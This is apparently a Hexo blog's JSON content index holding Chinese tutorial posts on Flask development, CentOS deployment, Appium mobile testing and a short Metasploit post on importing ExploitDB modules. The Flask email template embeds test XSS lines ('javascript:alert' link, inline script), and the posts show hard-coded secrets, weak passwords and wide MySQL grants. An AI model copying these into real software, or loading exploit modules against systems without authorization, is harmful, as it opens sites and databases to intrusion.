{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2018-06-09T12:41:47.797Z","updated":"2018-06-09T12:41:47.797Z","comments":false,"path":"/404.html","permalink":"http://yoursite.com//404.html","excerpt":"","text":""},{"title":"关于","date":"2018-06-09T13:03:03.699Z","updated":"2018-06-09T13:03:03.699Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"个人详细介绍 打工是不可能去打工的。"},{"title":"书单","date":"2018-06-09T12:41:47.798Z","updated":"2018-06-09T12:41:47.798Z","comments":false,"path":"books/index.html","permalink":"http://yoursite.com/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-09T13:02:37.610Z","updated":"2018-06-09T13:02:37.610Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":"google"},{"title":"Repositories","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-06-09T13:05:43.876Z","updated":"2018-06-09T13:05:43.876Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"熟练各种编程语言的读法 擅长多门语言从入门到放弃 晚睡晚起打游戏 不喜欢回答问题"}],"posts":[{"title":"0x002-exploitdb","slug":"metasploit/0x002-exploitdb","date":"2018-08-12T09:51:53.000Z","updated":"2018-08-12T09:54:47.050Z","comments":true,"path":"2018/08/12/metasploit/0x002-exploitdb/","link":"","permalink":"http://yoursite.com/2018/08/12/metasploit/0x002-exploitdb/","excerpt":"","text":"exploitdb 有着很多公开漏洞的POC，我们可以直接使用metasploit进行利用 searchsploit 用法示例 1234searchsploit 漏洞编号例如searchsploit ms15-100 结果示例 更新metasploit 新建文件夹 12# 这个文件夹是按照上图所示的文件夹建立的mkdir -p /root/.msf4/modules/exploits/windows/remote 复制到msf模块中 1cp /usr/share/exploitdb/exploits/windows/remote/38195.rb . 更新 1updatedb 最后 打开msfconsole就会看到如下效果","categories":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/categories/metasploit/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/tags/metasploit/"}]},{"title":"移动端测试4-安装apk","slug":"appium/移动端测试4-安装apk","date":"2018-08-11T15:29:51.000Z","updated":"2018-08-12T10:09:16.214Z","comments":true,"path":"2018/08/11/appium/移动端测试4-安装apk/","link":"","permalink":"http://yoursite.com/2018/08/11/appium/移动端测试4-安装apk/","excerpt":"","text":"概述 决定放弃安卓自带的虚拟机，一是因为x86支持现在大部分的apk，二是实在太难用。选择genymotion做为虚拟机运行工具 adb 使用adb 安装软件 1adb install xxxx.apk 然后就遇到了 Failure [INSTALL_FAILED_NO_MATCHING_ABIS] 这样的问题，虽然可以下载相关的插件进行拖进虚拟机里面安装，但是还没找到这个软件的官方地址。。。解决方案也是大家抄来抄去，一个答案2016年抄到了2018都有… 这里就不赘述了。 最后 成功安装了一个软件","categories":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/categories/appium/"}],"tags":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"0x007-部署centos","slug":"flask/0x007-部署centos","date":"2018-08-11T07:20:39.000Z","updated":"2018-08-11T07:22:19.810Z","comments":true,"path":"2018/08/11/flask/0x007-部署centos/","link":"","permalink":"http://yoursite.com/2018/08/11/flask/0x007-部署centos/","excerpt":"","text":"系统配置 创建新用户 123456789adduser -U wluser -s /bin/bashpasswd wluserpasswd:xxxxvisudo====wluser ALL=(ALL) ALL=====su wluser 导入环境变量 12345export MAIL_SERVER=smtp.163.comexport MAIL_PORT=25export MAIL_USERNAME=export MAIL_PASSWORD=... 安装python3 1234567891011121314151617181920212223242526272829303132333435363738394041$ sudo mkdir /usr/local/python3 # 创建安装目录# 下载 Python 源文件$ wget --no-check-certificate https://www.python.org/ftp/python/3.6.0/Python-3.6.0.tgz# 注意：wget获取https的时候要加上：--no-check-certificate$ tar -xzvf Python-3.6.0.tgz # 解压缩包$ cd Python-3.6.0 # 进入解压目录$ sudo ./configure --prefix=/usr/local/python3 # 指定创建的目录$ sudo make$ sudo make install$ sudo ln -s /usr/local/python3/bin/python3 /usr/bin/python3$ cd /usr/bin$ sudo mv python python.bak$ sudo ln -s /usr/local/python3/bin/python3 /usr/bin/python$ sudo vim /usr/bin/yum改为：#!/usr/bin/python2$ sudo vim /usr/libexec/urlgrabber-ext-down改为：#!/usr/bin/python2# 首先安装 epel 扩展源$ sudo yum -y install epel-release# 安装 python-pip$ sudo yum -y install python-pip# 清除 cache$ sudo yum clean all mysql 下载安装mysql 12345678910111213141516171819202122232425262728293031# 5.6 版本wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpmwget http://repo.mysql.com/mysql-community-release-el7-7.noarch.rpm# rpm安装源rpm -ivh mysql-community-release-el7-7.noarch.rpm# yum安装yum install -y mysql-server# 设置默认目录权限chown -R wluser:wluser /var/lib/mysql# 重启mysqlservice mysqld restart# 创建数据库create database `databasename` default character set utf8 collate utf8_general_ci;# 更改root密码update user set password=password(&apos;qwer1234&apos;) where user=&apos;root&apos;;# 远程登录用户grant all privileges on *(db name).* to &apos;username&apos;@&apos;%&apos; identified by &apos;qwe123&apos; with grant optionflush privileges;# 创建本地登录用户use awesome;grant all privileges on megablog.* to &apos;john&apos;@&apos;localhost&apos; identified by &apos;qwe123&apos;;flush privileges;# 重启mysqlservice mysql restart openresty 安装 12345678910111213141516171. 安装完以后，如果不是root安装，很容易访问首页会出现403 forbin的现象。 2. 安装依赖sudo yum install pcre-devel openssl-devel gcc curl3. 下载openresty4. 解压tar -zxvf openresty.tar.gz5. 安装./configure --with-luajit \\ --without-http_redis2_module \\ --with-http_iconv_module \\ --with-http_postgres_modulegmakegmake install nginx.conf 123456789101112131415161718192021222324252627282930events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #lua_shared_dict limit 50m; #lua_package_path &quot;/opt/openresty/nginx/conf/waf/?.lua&quot;; #init_by_lua_file &quot;/opt/openresty/nginx/conf/waf/init.lua&quot;; #access_by_lua_file &quot;/opt/openresty/nginx/conf/waf/access.lua&quot;; #log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; # &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; # &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; ... # 省略的配置全部注释掉 include &quot;/home/wluser/opt/nginx/conf/www.microblog.com.conf&quot;;&#125; 网站配置 1234567891011upstream microblog &#123; server 127.0.0.1:8000;&#125;server &#123; listen 80; server_name www.microblog.com; location / &#123; proxy_pass http://microblog; &#125;&#125; gunicorn 12# 启动四个线程gunicorn -b 127.0.0.1:8000 -w 4 run:app -D 总结 本来还想再上个waf的，但是出现问题，对于lua+nginx还不是太熟，就先放下了。后面继续完善","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"python模块-configparse","slug":"python/python模块-configparse","date":"2018-08-10T13:37:49.000Z","updated":"2018-08-10T13:38:39.031Z","comments":true,"path":"2018/08/10/python/python模块-configparse/","link":"","permalink":"http://yoursite.com/2018/08/10/python/python模块-configparse/","excerpt":"","text":"概述 学习一下configparse的用法。其实很简单，就是记录一下代码。方便查找 代码 config.ini 123456[head]title=&apos;Hello World&apos;[body]div=&quot;this is world&quot;h1 = &quot;this is h1&quot; config.py 12345678910111213141516171819202122232425#!/usr/bin/env python #-*- coding:utf-8 -*-import configparserconfig = configparser.ConfigParser()config.read(&apos;config.ini&apos;)sections = config.sections()print(sections) # [head, body]head = config[&apos;head&apos;]print(head) # &lt;Section: head&gt; title = head[&apos;title&apos;]print(title) # &apos;Hello World&apos;body = config[&apos;body&apos;]print(body) # &lt;Section: body&gt; for k,v in body.items(): print(k,v) # div &quot;this is world&quot;# h1 &quot;this is h1&quot;","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"移动端测试3-第一个脚本","slug":"appium/移动端测试3-第一个脚本","date":"2018-08-10T13:30:36.000Z","updated":"2018-08-12T10:09:13.174Z","comments":true,"path":"2018/08/10/appium/移动端测试3-第一个脚本/","link":"","permalink":"http://yoursite.com/2018/08/10/appium/移动端测试3-第一个脚本/","excerpt":"","text":"启动安卓虚拟机 1emulator -avd avd_name UI automate viewer 启动 12341. 在SDK的目录下面，直接运行脚本即可打开，2. 然后点击 device screenshot 按钮3. 需要注意的是appium要关掉不能打开，否则会出现错误4. 点击选取元素 appium 命令行开启 1234# 直接输入，也就启动了# 看来一下，appium貌似会启动adb，去寻找连接的安卓设备。还是挺好用的。appium 桌面版启动 直接双击启动 第一个脚本 我们基于python写第一个自动化测试脚本 安装依赖 1pip install appium-python-client 代码 123456789101112131415161718192021#!/usr/bin/env python#-*- coding:utf-8 -*-# author: johnwfrom appium import webdriverfrom time import sleepdesired_caps = &#123;&#125;desired_caps[&apos;platformName&apos;] = &apos;Android&apos; desired_caps[&apos;platformVersion&apos;] = &apos;6.0&apos; desired_caps[&apos;deviceName&apos;] = &apos;Android Emulator&apos; desired_caps[&apos;appPackage&apos;] = &apos;com.android.calculator2&apos; desired_caps[&apos;appActivity&apos;] = &apos;.Calculator&apos;driver = webdriver.Remote(&apos;http://localhost:4723/wd/hub&apos;, desired_caps)driver.find_element_by_id(&quot;com.android.calculator2:id/digit_8&quot;).click()driver.find_element_by_id(&quot;com.android.calculator2:id/op_mul&quot;).click()driver.find_element_by_id(&quot;com.android.calculator2:id/digit_9&quot;).click()driver.find_element_by_id(&quot;com.android.calculator2:id/eq&quot;).click()driver.quit() 总结 appium不需要做任何的设置，直接打开，在代码里面写好相关参数，直接运行，appium就能够连接到安卓虚拟机，进行执行。 问题 还有以下问题需要在以后实践： 如何连接真机 如果启动多台虚拟机多线程做自动化 如何启动多台真机做自动化 如何混合做自动化 如何持续集成 如何安装测试软件，安装过程如何测试","categories":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/categories/appium/"}],"tags":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"移动端测试2-测试环境搭建","slug":"appium/移动端测试2-测试环境搭建","date":"2018-08-09T12:46:53.000Z","updated":"2018-08-12T10:09:10.108Z","comments":true,"path":"2018/08/09/appium/移动端测试2-测试环境搭建/","link":"","permalink":"http://yoursite.com/2018/08/09/appium/移动端测试2-测试环境搭建/","excerpt":"","text":"概述 最近接触移动端测试，csdn大神写的真的是糊里糊涂，还号称从零入门，估计自己都没搞清楚。。。 也因为这样走了不少弯路，在这里记录一下。 实际上，要启动安卓虚拟机根本不需要狗屁的studio。直接下载命令行的sdk tool即可，下载studio下了一天。。。。 挂上梯子下载很多东西就很快。 安装nodejs 1234567891. 上官网下载安装2. 升级已有的nodejssudo npm install n -g// 升级到最新版本sudo n latest//升级到稳定版本sudo n stable3. 升级npmsudo npm install npm -g 命令安装appium 123sudo npm install -g cnpmcnpm install -g appiumcnmp install -g appium-doctor 软件安装appium 直接上官网下载安装 检查appium 1appium-doctor 检查配置 12345678910111213141516# 有时候你的shell设置为zsh的话，那么设置在.bash_profile 就会失效。这个时候就要设置在.zshrc里面，# JAVAexport JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Homeexport CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar# androidexport ANDROID_HOME=/Users/wenzhongwei/Library/Android/sdkexport ANDRIOD_SDK_HOME=/Users/wenzhongwei/Library/Android/sdkexport ANDROID_AVD_HOME=/Users/wenzhongwei/.android/avdexport PATH=$&#123;JAVA_HOME&#125;/bin:$ANDRIOD_SDK_HOME/tools:$ANDRIOD_SDK_HOME/platform-tools$ANDRIOD_HOME/emulator:$PATHalias emulator=$&#123;ANDROID_HOME&#125;/emulator/emulator# 另外安装，用于测试iosbrew install carthage 启动安卓虚拟机 下载sdk tools 不需要下载android studio。只需要命令行的sdk tools即可 点击下载 命令行启动 123456789101112131415161718192021cd /Users/wenzhongwei/Library/Android/sdkcd tools/bin# 查看平台./sdkmanager --list# 安装平台./sdkmanager &quot;platform;andriod-27&quot;# 创建虚拟机./avdmanager create avd --name myavd1 -k &quot;platform;andriod-27&quot;注意： 这里要指定ANDROID_AVD_HOME否则会出错。# 查看有哪一些虚拟机./avdmanager list avd# 注： 这里在windows上面要安装haxm，最新版安装失败，选择7.0 版本即可，在github上搜索Intel的版本进行下载# 启动emulator -avd myavd 启动ios虚拟机 使用simulator开启虚拟机","categories":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/categories/appium/"}],"tags":[{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"0x006-使用email","slug":"flask/0x006-使用email","date":"2018-08-08T14:15:14.000Z","updated":"2018-08-08T14:16:00.836Z","comments":true,"path":"2018/08/08/flask/0x006-使用email/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x006-使用email/","excerpt":"","text":"发送邮件重置密码 需求 重置密码需要用户输入邮箱，因此需要开发一个输入邮箱的页面 开发重置密码功能 准备工作 12pip install flask-mailpip install pyjwt 开发输入邮箱用于重置密码的页面 表单对象 123class ResetPasswdByEmailForm(FlaskForm): email = StringField(&quot;请输入你的邮箱：&quot;,validators=[DataRequired()]) submit = Submit(&quot;提交&quot;) 模板页面 1234567891011&#123;% extends &quot;_layout.html&quot; %&#125;&#123;% block main %&#125; &lt;form method=&quot;POST&quot;&gt; &#123;&#123; form.hidden_tag() &#125;&#125; &lt;div&gt; &#123;&#123; form.email.label &#125;&#125; &#123;&#123; form.email() &#125;&#125; &lt;/div&gt; &#123;&#123; form.submit() &#125;&#125; &lt;/form&gt;&#123;% endblock %&#125; 业务逻辑 1234567891011121314# 重置密码所需要填入email的页面@app.route(&apos;/reset/password&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def reset_passwd_by_email(): if current_user.is_authenticated: flash(&quot;已经登录啦&quot;) return redirect(url_for(&apos;index&apos;)) form = RestPasswdByEmailForm() if form.validate_on_submit(): user = User.query.filter_by(email=form.email.data).first() if user: send_password_reset_email(user) flash(&quot;已经发送邮件，如果没有收到邮件，请检查邮箱地址是否正确。&quot;) return redirect(url_for(&apos;login&apos;)) return render_template(&apos;reset_passwd_by_email.html&apos;,form=form) 开发重置密码功能 准备发送给用户邮件 1234567891011121314151617# templates/email/reset_passwd.txt | reset_passwd.html&lt;p&gt;Dear &#123;&#123; user.username &#125;&#125;,&lt;/p&gt;&lt;p&gt; To reset your password &lt;a href=&quot;&#123;&#123; url_for(&apos;reset_password&apos;, token=token, _external=True) &#125;&#125;&quot;&gt; click here &lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Alternatively, you can paste the following link in your browser&apos;s address bar:&lt;/p&gt;&lt;p&gt;&#123;&#123; url_for(&apos;reset_password&apos;, token=token, _external=True) &#125;&#125;&lt;/p&gt;&lt;p&gt;If you have not requested a password reset simply ignore this message.&lt;/p&gt;&lt;a href=&quot;javascript:alert(0)&quot;&gt;Click me to show xss&lt;/a&gt;&lt;script&gt; alert(1);&lt;/script&gt;&lt;p&gt;Sincerely,&lt;/p&gt;&lt;p&gt;The Microblog Team&lt;/p&gt; 发送邮件的功能 123456789101112131415161718192021222324252627281. 首先配置服务器地址，在config.py里面配置MAIL_SERVER = os.environ.get(\"MAIL_SERVER\")MAIL_PORT = os.environ.get(\"MAIL_PORT\") or 25MAIL_USE_TLS = os.environ.get(\"MAIL_USE_TLS\") is not NoneMAIL_USERNAME = os.environ.get(\"MAIL_USERNAME\")MAIL_PASSWORD = os.environ.get(\"MAIL_PASSWORD\")2. 开发发送邮件的函数, email.py# 在flask中，有两个状态，一个是请求上下文，一个应用程序上下文# 很多时候，这两种状态，flask会自动去调配# 但是如果是自己起的线程，就需要自己去适配。# 具体还需要学习。def send_async_email(app,msg): with app.app_context(): mail.send(msg)def send_email(subject,sender,recipients,text_body,html_body): msg = Message(subject,sender=sender,recipients=recipients) msg.body = text_body msg.html = html_body Thread(target=send_async_email, args=(app,msg)).start()# 发送邮件def send_password_reset_email(user): token = user.generate_token() send_email(\"【重置你的密码】\",sender=app.config['MAIL_USERNAME'],recipients=[user.email], text_body=render_template('email/reset_password.txt',user=user,token=token), html_body = render_template('email/reset_password.html',user=user,token=token)) token的功能 token用于我们判断这个用户是否是本人，也就是从这个邮箱里面链接，这个我们在这个用户的类里面直接生成。 12345678910111213141516class User(UserMixix,db.Model): ... def generate_token(self,expires_in=600): return jwt.encode( &#123;\"reset_passwd\":self.id,\"exp\":time()+ expires_in&#125;, app.config['SECRET_KEY'],algorithm='HS256').decode('utf-8') @staticmethod def validate_token(token): try: id = jwt.decode( token,app.config['SECRET_KEY'],algorithms=['HS256'])['reset_passwd'] except: app.logger.error(\"查无此人，此token为&#123;&#125;\".format(token)) return return User.query.get(id) 修改密码的实际页面 首先判断这个user是不是登录了 验证一下传过来的token，查询用户，如果是失效的，或者不符合的，直接返回 开始接受表单数据，写入数据库 1234567891011121314151617181920212223242526# 重置密码的真实页面@app.route('/reset/password/&lt;token&gt;',methods=['GET','POST'])def reset_password(token): if current_user.is_authenticated: flash(\"已经登录啦。\") return rediretc(url_for('index')) user = User.validate_token(token) if not user: flash(\"验证失败，返回首页\") return redirect(url_for('index')) form = ResetPasswdForm() if form.validate_on_submit(): passwd = form.password.data user.set_password(passwd) try: db.session.commit() flash(\"成功修改密码！！\") except Exception as e: app.logger.error(e) db.session.rollback() flash(\"修改密码失败！\") return redirect(url_for('reset_passwd')) return redirect(url_for('login')) return render_template('reset_passwd.html',form=form) 模板页面 123456789101112131415&#123;% extends &quot;_layout.html&quot; %&#125;&#123;% block main %&#125; &lt;form method=&quot;POST&quot;&gt; &#123;&#123; form.hidden_tag() &#125;&#125; &lt;div&gt; &#123;&#123; form.password.label &#125;&#125; &#123;&#123; form.password() &#125;&#125; &lt;/div&gt; &lt;div&gt; &#123;&#123; form.password2.label &#125;&#125; &#123;&#123; form.password2() &#125;&#125; &lt;/div&gt; &#123;&#123; form.submit() &#125;&#125; &lt;/form&gt;&#123;% endblock %&#125;","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"0x005-错误处理","slug":"flask/0x005-错误处理","date":"2018-08-08T14:14:37.000Z","updated":"2018-08-08T14:14:55.454Z","comments":true,"path":"2018/08/08/flask/0x005-错误处理/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x005-错误处理/","excerpt":"","text":"需求 页面错误的处理，比如404页面，500页面 发送email，通知当前发生的错误 将发生的错误记录到本地log 页面错误的处理 页面错误的处理其实有两种，一种是基于全局的，一种是基于蓝图。我们这个项目没有用到蓝图 全局的就使用errorhandler(404) 蓝图就要使用app_errorhandler(404) 12345678910111213#!/usr/bin/env python#-*- coding:utf-8 -*-from . import appfrom flask import render_template@app.errorhandler(404)def page_not_found(e): return render_template('404.html'),404@app.errorhandler(500)def Internal_error(e): return render_template('500.html'),500 记录log flask 内部维护了一个logger记录器，可以直接使用app.logger来使用，我们在定义RotatingFileHandler这个类来进行日志格式的定义。这样就完成了 1234567891011121314# microapp/__init__.pyif not app.debug: if not os.path.exists('logs'): os.mkdir('logs') file_handler = RotatingFileHandler('logs/microblog.log',maxBytes=10240,backupCount=10) file_handler.setFormatter(logging.Formatter( '%(asctime)s %(levelname)s:%(message)s [in %(pathname)s:%(lineno)d]' )) app.logger.addHandler(file_handler) app.logger.setLevel(logging.INFO) app.logger.info(\"app startup\")","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"0x004-数据库使用","slug":"flask/0x004-数据库使用","date":"2018-08-08T14:14:04.000Z","updated":"2018-08-08T14:14:22.775Z","comments":true,"path":"2018/08/08/flask/0x004-数据库使用/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x004-数据库使用/","excerpt":"","text":"概述 使用pymysql做为数据库驱动 使用flask-sqlalchemy做为数据库orm对象框架 使用flask-migrate做为数据库版本控制框架 准备工作 安装数据库相关依赖 123pip install pymysqlpip install flask-sqlalchemypip install flask-migrate 数据库配置 1234567891011121314# config.pyclass Config(object): ... SQLALCHEMY_DATABASE_URI = \"mysql+pymysql://test:qwe123@192.168.232.132/megablog\" SQLALCHEMY_TRACK_MODIFICATIONS = False----------# microapp/__init__.py...from flask_sqlalchemy import SQLAlchemyfrom flask_migrate import Migrate ...db = SQLAlchemy(app)migrate = Migrate(db,app) 数据库关系 一般来说现在有三种数据库关系 一对一 多对一 多对多 一对一 1在一对多的关系语句上db.relationship()基础上添加一个uselist=False 一对多 12345678910111213数据库中如果是一对多的关系，那么就是在唯一的一方，保存id，在多的一方保存关系比如，一片文章只能有一个人来发表，那么post里面就保存user_id 作为外键一个人可以发表多篇文章，那么user里面就保存关系class Post(db.Model): ... user_id = db.Column(db.Integer,db.ForeignKey('user.id'))class User(UserMixin,db.Model): ... posts = db.relationship('Post',backref='author',lazy='dynamic') 多对多 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687多对多比较复杂，有两种情况，需要新建一个表来进行映射，这里我们采用学生和老师的关系来理解第一种情况，即多对多是两个不同的类1. 一个学生的类，肯定是对应着多位老师的类2. 一个老师的类，肯定也是对应着多位学生的类association = db.Table('association', # 把学生放在了左边 db.Column('student_id',db.Integer,db.ForeignKey('student.id')), # 把老师放在了右边 db.Column('teacher_id',db.Integer,db.ForeignKey('teacher.id')),)class Student(db.Model): __tablename__ ='student' id = db.Column(db.Integer,primary_key=True) name=db.Column(db.String(64)) # 这个backref应该通常要指回自己，代表反向查询 # 比如我们可以通过student.teachers查询到所有老师 # 又通过某个老师查询到所有学生student.teachers[0].students teachers = db.relationship('Teacher',secondary=association,backref='students')class Teacher(db.Model): __tablename__ ='teacher' id =db.Column(db.Integer,primary_key=True) name = db.Column(db.String(120)) students = db.relationship('Student',secondary=association,backref='teachers')# 操作流程# 添加两个学生两个老师&gt;&gt;&gt; s = Student(name=\"johnw1\")&gt;&gt;&gt; s2 = Student(name=\"jacob\")&gt;&gt;&gt; t1 = Teacher(name=\"jack1\")&gt;&gt;&gt; t2 = Teacher(name=\"jack2\")# 在学生里面添加老师&gt;&gt;&gt; s.teachers.append(t1)&gt;&gt;&gt; s.teachers.append(t2)&gt;&gt;&gt; s2.teachers.append(t1)&gt;&gt;&gt; s2.teachers.append(t2)# 提交&gt;&gt;&gt; db.session.add(s)&gt;&gt;&gt; db.session.add(t1)&gt;&gt;&gt; db.session.add(t2)&gt;&gt;&gt; db.session.add(s2)&gt;&gt;&gt; db.session.commit()# 结果&gt;&gt;&gt; s2.teachers[&lt;Teacher 3&gt;, &lt;Teacher 4&gt;]&gt;&gt;&gt; s2.teachers[0].student[&lt;Student 2&gt;, &lt;Student 3&gt;]&gt;&gt;&gt; s.teachers[&lt;Teacher 3&gt;, &lt;Teacher 4&gt;]# 反向查询，通过学生查到老师，再查到一共有几个学生。&gt;&gt;&gt; s.teachers[0].students[&lt;Student 2&gt;, &lt;Student 3&gt;]# 老师添加学生也是同样的情况&gt;&gt;&gt; s3 = Student(name=\"wen\")&gt;&gt;&gt; s4 = Student(name=\"wen2\")&gt;&gt;&gt; t1.students.append(s3)&gt;&gt;&gt; t1.students.append(s4)&gt;&gt;&gt; db.session.commit()第二种情况，多对多是同一个类。以本程序为例子，用户关注和被关注，都是用到了user这个类而已。1. 首先新建一个映射的表follow_table = db.Table(\"follow_table\", db.Column(\"follower_id\",db.Integer,db.ForeignKey('user.id')), db.Column(\"followed_id\",db.Integer,db.ForeignKey(\"user.id\")))在这里我们将关注者放在了左边，被关注者放在了右边2. 创建关系class User(UserMixin,db.Model): followed = db.relationship(\"User\",secondary=follow_table, # 第一层定义关注者 primaryjoin = (follow_table.c.follower_id == id), # 第二层定义被关注者 secondaryjoin = (follow_table.c.followed_id == id), # 反向查询，就可以查询出这个被关注者有多少粉丝 backref = db.backref('followers',lazy='dynamic'),lazy='dynamic'))通过sql打印，我们可以看到&gt;&gt;&gt; print(u2.followed)SELECT user.id AS user_id, user.username AS user_username, user.email AS user_email, user.password_hash AS user_password_hash, user.des AS user_des, user.register_date AS user_register_dateFROM user, follow_tableWHERE follow_table.follower_id = %(param_1)s AND follow_table.followed_id = user.id 最后，上面代码中使用了多次 lazy = ‘dynamic’ 这是为了避免一次查询的数据太多，如果只是返回一个数据，那就没必要，如果返回大量的数据，那么性能就会提高很多。 数据库ORM写法 123456789101112class User(db.Model): __tablename__ = &quot;user&quot; id = db.Column(db.Integer,primary_key=True) username = db.Column(db.String(64),index=True,unique=True) email = db.Column(db.String(120),index=True,unique=True) password_hash = db.Column(db.String(128)) des = db.Column(db.Text) register_date = db.Column(db.DateTime,default=datetime.now) posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;) def __repr__(self): return &quot;&lt;user:&#123;&#125;&gt;&quot;.format(self.username)","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"0x003-表单的应用","slug":"flask/0x003-表单的应用","date":"2018-08-08T14:13:32.000Z","updated":"2018-08-08T14:13:51.575Z","comments":true,"path":"2018/08/08/flask/0x003-表单的应用/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x003-表单的应用/","excerpt":"","text":"概述 在flask中，通常使用flask-wtf来创建一个表单对象，并在表单对象中，对其中的字段进行验证。 准备工作 安装flask-wtf 1pip install flask-wtf 设置SECRET_KEY 12345678910111213app.config[&apos;SECRET_KEY&apos;] = &apos;xxxxx&apos;新建config.py#!/usr/bin/env python#-*- coding:utf-8 -*-import osclass Config(object): SECRET_KEY = &apos;02cc16ca-a181-4fe5-bf7e-3e7820fb9bfb&apos; ...最后使用app.config.from_object(Config) 使用flask-wtf创建对象 创建表单对象 render_kw 用于渲染html属性 validate_xxxfield 用于验证xxx字段 123456789101112131415161718192021222324252627class LoginForm(FlaskForm): username = StringField(&apos;Username&apos;,validators=[DataRequired()],render_kw=&#123; &quot;class&quot;:&quot;form-control&quot;, &quot;id&quot;:&quot;inputEmail3&quot;, &quot;placeholder&quot;:&quot;Username&quot; &#125;) ... submit = SubmitField(&quot;Submit&quot;) class RegisterForm(FlaskForm): username = StringField(&quot;请输入用户名：&quot;,validators = [DataRequired(),Length(1,16,message=&apos;用户名不能超过16个字符&apos;),Regexp(r&apos;[a-zA-Z0-9\\u4e00-\\u9fa5]&apos;,message=&apos;只接受字母数字和中文&apos;)]) password = PasswordField(&quot;请输入密码：&quot;,validators = [DataRequired()]) password2 = PasswordField(&quot;重新输入密码：&quot;,validators=[DataRequired(),EqualTo(&quot;password&quot;,message=&quot;两次输入的密码必须要相同&quot;)]) email = StringField(&quot;请输入邮箱：&quot;,validators = [DataRequired(),Email(message=&apos;邮箱格式有误。&apos;)]) des = TextAreaField(&quot;自我介绍:&quot;,validators=[DataRequired()]) submit = SubmitField(&quot;提交&quot;) def validate_username(self,username): user = User.query.filter_by(username=username.data).first() if user: raise ValidationError(&apos;error&apos;) def validate_email(self,email): email = User.query.filter_by(email = email.data).first() if email: raise ValidationError(&quot;error&quot;) 模板应用 1234567891011121314151617181920212223&lt;form class=&quot;form-horizontal&quot; method=&quot;POST&quot;&gt; &#123;&#123; form.hidden_tag() &#125;&#125; &lt;div class=&quot;form-group&quot;&gt; &#123;&#123; form.username.label(class_=&quot;col-sm-2 control-label&quot;)&#125;&#125; &lt;div class=&quot;col-sm-10&quot;&gt; &#123;&#123; form.username() &#125;&#125; &#123;% for error in form.username.errors %&#125; &lt;span style=&quot;color:red&quot;&gt;&#123;&#123; error &#125;&#125;&lt;/span&gt; &#123;% endfor %&#125; &lt;/div&gt; &lt;/div&gt; ... &lt;div class=&quot;form-group&quot;&gt; &lt;div class=&quot;col-sm-offset-2 col-sm-10&quot;&gt; &#123;&#123; form.submit(class_=&apos;class=&quot;btn btn-default&quot;&apos;)&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; 视图函数 1234567@auth.route(&apos;/login&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def login(): ... form=LoginForm() if form.validate_on_submit(): ... return render_template(&apos;auth/login.html&apos;,title=&apos;login&apos;,form=form)","categories":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/categories/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"0x002-jinja2静态模板应用","slug":"flask/0x002-jinja2静态模板应用","date":"2018-08-08T14:13:00.000Z","updated":"2018-08-08T14:13:18.058Z","comments":true,"path":"2018/08/08/flask/0x002-jinja2静态模板应用/","link":"","permalink":"http://yoursite.com/2018/08/08/flask/0x002-jinja2静态模板应用/","excerpt":"","text":"概述 